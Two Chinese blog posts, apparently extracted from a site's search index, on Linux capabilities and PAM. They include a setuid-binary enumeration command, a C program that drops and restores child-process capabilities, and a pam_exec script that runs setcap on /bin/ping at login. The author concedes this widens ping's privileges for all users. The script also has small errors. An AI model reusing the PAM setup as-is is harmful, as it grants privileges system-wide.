reboot(2) 和 kexec_load(2)。 CAP_SYS_CHROOT使用 chroot(2)。 CAP_SYS_MODULE加载和卸载内核模块(参考 init_module(2) 和 delete_module(2))；在 2.6.25 之前的内核中：从系统范围内的权能边界集合中丢弃权能。 CAP_SYS_NICE 触发进程 nice 值 (nice(2)，setpriority(2)) 和为任意进程改变 nice 值； 为调用进程设置实时调度策略，及为任意进程设置调度策略和优先级 (sched_setscheduler(2)，sched_setparam(2)，shed_setattr(2))； 为任意进程设置 CPU affinity (sched_setaffinity(2))； 为任意进程设置 I/O 调度类别和优先级 (ioprio_set(2))； 对任意进程应用 migrate_pages(2) 并允许进程被迁移到任意节点； 对任意进程应用 move_pages(2)； 在 mbind(2) 和 move_pages(2) 中使用 MPOL_MF_MOVE_ALL 标记。 CAP_SYS_PACCT使用 acct(2)。 CAP_SYS_PTRACE 使用 ptrace(2) 追踪任意进程； 对任意进程应用 get_robust_list(2)； 使用 process_vm_readv(2) 和 process_vm_writev(2) 同任意进程的内存传输数据； 使用 kcmp(2) 检查进程。 CAP_SYS_RAWIO 执行 I/O 端口操作 (iopl(2) 和 ioperm(2))； 访问 /proc/kcore； 使用 FIBMAP ioctl(2) 操作； 打开设备访问 x86 模式特有寄存器 (MSRs，参考 msr(4))； 更新 /proc/sys/vm/mmap_min_addr； 在地址低于 /proc/sys/vm/mmap_min_addr 的位置创建内存映射； 在 /proc/bus/pci 中映射文件； 打开 /dev/mem 和 /dev/kmem； 执行各种 SCSI 设备命令； 在 hpsa(4) 和 cciss(4) 设备上执行某一操作； 在其它设备上执行一系列设备特有操作。 CAP_SYS_RESOURCE 使用 ext2 文件系统上的预留空间； 执行 ioctl(2) 调用控制 ext3 日志； 覆盖磁盘配额限制； 增加资源限制 (参考 setrlimit(2))； 覆盖 RLIMIT_NPROC 资源限制； 在终端分配上覆盖最大的终端数； 覆盖最大的 keymaps 个数； 允许实时时钟中断大于64 hz； 触发一个 System V 消息队列的 msg_qbytes 限制超过 /proc/sys/kernel/msgmnb 中的限制 (参考 msgop(2) 和 msgctl(2))； 当使用 F_SETPIPE_SZ fcntl(2) 命令设置一个管道的容量时覆盖 /proc/sys/fs/pipe-size-max 的限制； 使用 F_SETPIPE_SZ 增加管道的容量超出 /proc/sys/fs/pipe-max-size 指定的限制； 当创建 POSIX 消息队列 (参考 mq_overview(7)) 时覆盖 /proc/sys/fs/mqueue/queues_max 的限制； 使用 prctl(2) PR_SET_MM 操作； 设置 /proc/PID/oom_score_adj 为一个小于由一个具有 CAP_SYS_RESOURCE 的进程最近设置的值的值。 CAP_SYS_TIME设置系统时钟 (settimeofday(2)，stime(2)，adjtimex(2))；设置实时 (硬件) 时钟。 CAP_SYS_TTY_CONFIG使用 vhangup(2)；对虚拟终端使用各种特权 ioctl(2) 操作。 CAP_SYSLOG (自 Linux 2.6.37) 执行特权 syslog(2) 操作。参考 syslog(2) 来获取哪些操作需要特权的信息； 当 /proc/sys/kernel/kptr_restrict 值为 1 时，查看通过 /proc 和其它接口暴露的内核地址。(参考 proc(5) 中 kptr_restrict 的讨论。) CAP_WAKE_ALARM (自 Linux 3.0)触发将唤醒系统的东西 (设置 CLOCK_REALTIME_ALARM 和 CLOCK_BOOTTIME_ALARM 定时器) 找出所有设置uid 位程序，使用以下命令： 12find / -perm /u=sfind / -perm -4000 结果如下： 部分需要的权能如下： 程序 需要的权能 /bin/ping CAP_NET_RAW /bin/mount CAP_SYS_ADMIN /bin/su CAP_DAC_OVERRIDE,CAP_SETGID,CAP_SETUID /bin/fusermount CAP_SYS_ADMIN /bin/umount CAP_SYS_ADMIN /usr/bin/passwd CAP_CHOWN ,CAP_DAC_OVERRIDE ,CAP_FOWNER 在linux中，文件权能有如下三种： effective：当前有效的权能，执行某特权操作时，操作系统检查cap_effective的对应位是否有效,而不再是检查进程的有效UID是否为0。 permitted：当前进程所有能使用的能力，effective包含于permitted inheritable：可以被继承的能力 linux程序调用子程序，权能变换公式如下： 1234P’(ambient) = (file is privileged) ? 0 : P(ambient)P'(permitted) = (P(inheritable) &amp; F(inheritable)) | (F(permitted) &amp; cap_bset)| P’(ambient)P'(effective) = F(effective) ? P'(permitted) : P’(ambient)P'(inheritable) = P(inheritable) [i.e., unchanged] 其中： P denotes the value of a thread capability set before the execve(2) P’ denotes the value of a capability set after the execve(2) F denotes a file capability set cap_bset is the value of the capability bounding set (described below). A privileged file is one that has capabilities or has the set-user-ID or set-group-ID bit set. 实现一个程序其满足以下的功能： 能够永久的删除其子进程的某个权能。 能暂时性的删除其子进程的某个权能。 能让上面被暂时性删除的权能重新获得 以ping为例，我们知道ping需要的权能为cap_net_raw，为了能在execve后执行ping，即execve中的ping有cap_net_raw权能，根据上面的变换规则： 设置/bin/ping权能为cap_net_raw+ei，使得可以继承 sudo setcap cap_net_raw+ei /bin/ping 设置当前的进程的权能有cap_net_raw+i权能 永久删除子进程的权能就移除effective和inheritable、permitted的，暂时性删除就移除effective和inheritable的，恢复暂时性删除的就添加进effective和inheritable。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/capability.h&gt;#include &lt;sys/prctl.h&gt;#undef _POSIX_SOURCEextern int errno;void whoami() &#123; printf(\"uid=%i euid=%i gid=%i\\n\", getuid(), geteuid(), getgid());&#125;void listCaps()&#123; cap_t caps = cap_get_proc(); ssize_t y = 0; printf(\"The Process %d was give capabilities %s\\n\",(int) getpid(), cap_to_text(caps, &amp;y)); fflush(0); cap_free(caps);&#125;void do_ping()&#123; if(!fork())&#123; whoami(); listCaps(); execlp(\"ping\",\"ping\",\"-c 1\",\"localhost\",NULL); &#125;&#125;void init()&#123; if(getuid() != 0)&#123; puts(\"请使用sudo执行本程序\"); exit(1); &#125; cap_value_t cap_values[] = &#123;CAP_SETUID, CAP_SETGID, CAP_SETPCAP ,CAP_NET_RAW&#125;; cap_t caps = cap_init(); cap_set_flag(caps, CAP_PERMITTED, 4, cap_values, CAP_SET); cap_set_flag(caps, CAP_EFFECTIVE, 4, cap_values, CAP_SET); cap_set_proc(caps); prctl(PR_SET_KEEPCAPS, 1, 0, 0, 0); cap_free(caps); setgid(1000); setuid(1000); caps = cap_get_proc(); cap_set_flag(caps, CAP_EFFECTIVE, 4, cap_values, CAP_SET); cap_set_flag(caps, CAP_INHERITABLE, 4, cap_values, CAP_SET); cap_set_proc(caps); cap_free(caps); whoami(); listCaps();&#125;void printInfo()&#123; puts(\"\\n------权能测试小程序------\\n\\请输入如下字符:\\n\\1 : 永久的删除其子进程的某个权能\\n\\2 : 暂时性的删除其子进程的某个权能\\n\\3 : 暂时性删除的权能重新获得\\n\\4 : ping -c 1 localhost\\n\\5 : 查看当前权能\\n\\q : 退出\\n\\---------------------------\\n\");&#125;int main(int argc, char **argv)&#123; init(); char line[128]; printInfo(); while(fgets(line, sizeof(line), stdin))&#123; char cmd = line[0]; if(cmd == '1' || cmd == '2' || cmd == '3')&#123; printf(\"输入要操作的权能名，如cap_net_raw\\n\"); fgets(line, sizeof(line), stdin); line[strlen(line) - 1] = '\\0'; cap_value_t temp; if(cap_from_name(line, &amp;temp) &lt; 0)&#123; printf(\"Error capability name\\n\"); &#125; else&#123; cap_t caps = cap_get_proc(); if(cmd == '3')&#123; cap_set_flag(caps, CAP_EFFECTIVE, 1, &amp;temp, CAP_SET); cap_set_flag(caps, CAP_INHERITABLE, 1, &amp;temp, CAP_SET); &#125; else&#123; cap_set_flag(caps, CAP_EFFECTIVE, 1, &amp;temp, CAP_CLEAR); cap_set_flag(caps, CAP_INHERITABLE, 1, &amp;temp, CAP_CLEAR); if(cmd == '1') cap_set_flag(caps, CAP_PERMITTED, 1, &amp;temp, CAP_CLEAR); &#125; if(cap_set_proc(caps)) perror(\"cap_set_proc() ERROR: \"); else printf(\"%s %s success\\n\", (cmd =='3'? \"recover\":\"remove\"),line); cap_free(caps); &#125; &#125; else if(cmd == '4') do_ping(); else if(cmd == '5') listCaps(); else if(cmd == 'q') break; sleep(1); //休眠1s printInfo(); &#125; return 0;&#125; 程序测试： 测试环境： 运行程序前：sudo setcap cap_net_raw+eip /bin/ping 保证文件有eip 权能 sudo apt install libcap-dev gcc cap.c -lcap -o cap sudo ./cap 一开始可以ping : 暂时性删除权能后无法ping : 恢复后可以ping : 永久删除后无法ping : 参考资料： Linux setuid与权能介绍 Linux 权能综述","categories":[{"name":"Linux","slug":"Linux","permalink":"https://xsyin.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://xsyin.github.io/tags/Linux/"},{"name":"capability","slug":"capability","permalink":"https://xsyin.github.io/tags/capability/"}]},{"title":"Linux权能与PAM机制","slug":"Linux权能与PAM机制","date":"2018-05-01T00:09:12.000Z","updated":"2018-05-01T00:09:12.000Z","comments":true,"path":"2018/05/01/Linux权能与PAM机制/","link":"","permalink":"https://xsyin.github.io/2018/05/01/Linux权能与PAM机制/","excerpt":"实验环境：uname -a ​ Linux ubuntu 4.4.0-121-generic #145-Ubuntu SMP Fri Apr 13 13:47:23 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 权能对应的系统调用使用 sudo find / -name capability.h 查找到路径 /usr/src/linux-headers-4.4.0-121/include/uapi/linux/capbility.h ，整理可得下表：","text":"实验环境：uname -a ​ Linux ubuntu 4.4.0-121-generic #145-Ubuntu SMP Fri Apr 13 13:47:23 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 权能对应的系统调用使用 sudo find / -name capability.h 查找到路径 /usr/src/linux-headers-4.4.0-121/include/uapi/linux/capbility.h ，整理可得下表： 权能 编号(相关系统调用） 解释 CAP_CHOWN 0(chown) 对文件的UIDs和GIDs做任意修改 CAP_DAC_OVERRIDE 1 忽略对文件的DAC访问限制 CAP_DAC_READ_SEARCH 2 忽略DAC中对文件和目录的读、搜索权限 CAP_FOWNER 3 忽略进程UID与文件UID的匹配检查 CAP_FSETID 4 文件修改时不清除setuid和setgid位，不匹配时设置setgid位 CAP_KILL 5(kill) 绕过发送信号时的权限检查 CAP_SETGID 6(setgid) 设置或管理进程GID CAP_SETUID 7(setuid) 管理或设置进程UID CAP_SETPCAP 8(capset) 允许授予或删除其他进程的任何权能 CAP_LINUX_IMMUTABLE 9(chattr) 允许设置文件的不可修改位(IMMUTABLE)和只添加(APPND-ONLY)属性 CAP_NET_BIND_SERVICE 10 允许绑定到小于1024的端口 CAP_NET_BROADCAST 11 允许socket发送监听组播 CAP_NET_ADMIN 12 允许执行网络管理任务 CAP_NET_RAW 13(socket) 允许使用原始套接字 CAP_IPC_LOCK 14(mlock) 允许锁定共享内存片段 CAP_IPC_OWNER 15 忽略IPC所有权检查 CAP_SYS_MOUDLE 16(init_module) 插入和删除内核模块 CAP_SYS_RAWIO 17 允许对ioperm/iopl的访问 CAP_SYS_CHROOT 18(chroot) 允许使用chroot()系统调用 CAP_SYS_PTRACE 19(ptrace) 允许跟踪任何进程 CAP_SYS_PACCT 20(acct) 允许配置进程记账 CAP_SYS_ADMIN 21 允许执行系统管理任务 CAP_SYS_BOOT 22(reboot) 允许重新启动系统 CAP_SYS_NICE 23(nice) 允许提升优先级，设置其他进程优先级 CAP_SYS_RESOURCE 24(setrlimit) 设置资源限制 CAP_SYS_TIME 25(stime) 允许改变系统时钟 CAP_SYS_TTY_CONFIG 26(vhangup) 允许配置TTY设备 CAP_MKNOD 27(mknod) 允许使用mknod()系统调用，创建特殊文件 CAP_LEASE 28(fcntl) 为任意文件建立租约 CAP_AUDIT_WRITE 29 允许向内核审计日志写记录 CAP_AUDIT_CONTROL 30 启用或禁用内核审计，修改审计过滤器规则 CAP_SETFCAP 31 设置文件权能 CAP_MAC_OVERRIDE 32 允许MAC配置或状态改变，为smack LSM实现 CAP_MAC_ADMIN 33 覆盖强制访问控制 CAP_SYSLOG 34(syslog) 执行特权syslog(2)操作 CAP_WAKE_ALARM 35 触发将唤醒系统的东西 CAP_BLOCK_SUSPEND 36(epoll) 可以阻塞系统挂起的特性 CAP_AUDIT_READ 37 允许通过一个多播socket读取审计日志 详情见man capabilities 。 基于PAM用户权限设置系统PAM 的全称为“可插拔认证模块（Pluggable Authentication Modules）”。设计的初衷是将不同的底层认证机制集中到一个高层次的API中，从而省去开发人员自己去设计和实现各种繁杂的认证机制的麻烦。 PAM认证一般遵循这样的顺序：Service(服务)→PAM(配置文件)→pam_*.so，PAM配置文件在/etc/pam.d/ 目录下，原理图如下： PAM中配置字段： 1moudle_type control_flag moudle_path moudle_option/moudle_args module_type 为 相应服务指定模块类型 模块类型 说明 auth(验证模块) 用于验证用户或设置/销毁凭证 account(帐户管理模块) 将执行与访问、帐户及凭证有效期、密码限制/规则等有关的操作 session(会话管理模块) 定义用户登录前的,及用户退出后所要进行的操作.如:登录连接信息,用户数据的打开与关闭,挂载文件系统等 passwd(密码管理模块) 将执行与密码更改/更新有关的操作 control_flag 将指定模块的堆栈行为，配置文件中列出模块被调用的顺序 控制标记 说明 required 堆栈中的所有 required 模块必须看作一个成功的结果。如果一个或多个 required 模块失败，则实现堆栈中的所有 required 模块，但是将返回第一个错误 requisite 如果本模块没有被满足，那本次认证一定失败，而且整个栈立即中止并返回错误信号 sufficient 如果标记为 sufficient 的模块成功并且先前没有 required 或 sufficient 模块失败，则忽略堆栈中的所有其余模块并返回成功 optional 如果堆栈中没有一个模块是 required 并且没有任何一个 sufficient 模块成功，则服务/应用程序至少要有一个 optional 模块成功 include 包含其他规则（服务），文件嵌套，可以互相调用，如：login，auth，system-auth等 [value1=action1 value2=action2 ….] 六种动作：ok ，done，bad，die，ignore，reset。 ​ Example：auth [user_unknown=ignore success=ok ignore=ignore default=bad] pam_securetty.so module_path 将指定实现模块的库对象的路径名称。默认情况下，它将被设为 /lib/security。 module_options/module_args（可选字段）将指定可以传递给服务模块的选项或实参。 实验：配置用户userping ，设置cap_net_raw 权能。 添加用户userping : sudo adduser userping 查看并清除/bin/ping 的权能： 切换到用户userping 再ping 无法ping : su userping userping 登录时给/bin/ping 添加权能： 12345678910111213141516###################################################### File Name: ping_cap.sh# Author: xsyin# mail: shouyinXu@163.com# Created Time: 2018年04月30日 星期一 16时05分57秒#####################################################!/bin/sh[ \"$PAM_TYPE\" == \"open_session\" ] || exit 0if [ \"$PAM_USER\" == \"userping\" ]; then setcap cap_net_raw=eip /bin/ping echo \"SUCCESS\"else echo \"FAILURE\"fi 将ping_cap.sh 移动到 /usr/local/bin 路径下，并设置为可执行： 1sudo chmod u+x /usr/loca/bin/ping_cap.sh 所有登录都使用common-session 模块： 因此在common-session 模块中添加规则: 1session optional pam_exec.so debug log=/tmp/pam_exec.log seteuid /usr/local/bin/ping_cap.sh 必须模块，开启了debug模式，用户userping 每次登录会执行ping_cap.sh 切换到userping 用户： 出错多次，最终调试成功： 总结优点：userping 用户无法执行特权命令，通过pam 可赋予一些特权操作。 缺点：本实验中修改了ping 的文件权能，影响了其他用户。退出userping 后，ping 命令变成有效了。 过渡C版本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/************************************************************************* &gt; File Name: ping_cap.c &gt; Author: xsyin &gt; Mail: shouyinXu@163.com &gt; Created Time: 2018年04月30日 星期一 14时56分35秒 &gt; Make: gcc ping_cap.c -lcap -o ping_cap ************************************************************************/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/capability.h&gt;#include &lt;sys/prctl.h&gt;#undef _POSIX_SOURCEextern int errno;const char *path_p = \"/bin/ping\";void listCaps()&#123; cap_t caps = cap_get_file(path_p); ssize_t y = 0; printf(\"The file %s was give capabilities %s\\n\",path_p, cap_to_text(caps, &amp;y)); fflush(0); cap_free(caps);&#125;int main(int argc, char const *argv[])&#123; uid_t uid = getuid(); if(uid != 1000) return 0; printf(\"uid:%d\\n\", uid); cap_value_t cap_values[] = &#123;CAP_NET_RAW&#125;; cap_t caps = cap_init(); cap_set_flag(caps,CAP_PERMITTED,1,cap_values,CAP_SET); cap_set_flag(caps,CAP_EFFECTIVE,1,cap_values,CAP_SET); cap_set_flag(caps,CAP_INHERITABLE,1,cap_values,CAP_SET); if(cap_set_file(path_p,caps)) perror(\"cap_set_file() ERROR: \"); else printf(\"success\\n\"); cap_free(caps); listCaps(); return 0;&#125; 缺陷：未搞清楚如何获取PAM正在授权的用户，无法判断切换至userping 用户时设置权能。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://xsyin.github.io/categories/Linux/"}],"tags":[{"name":"Linux capability","slug":"Linux-capability","permalink":"https://xsyin.github.io/tags/Linux-capability/"}]}]}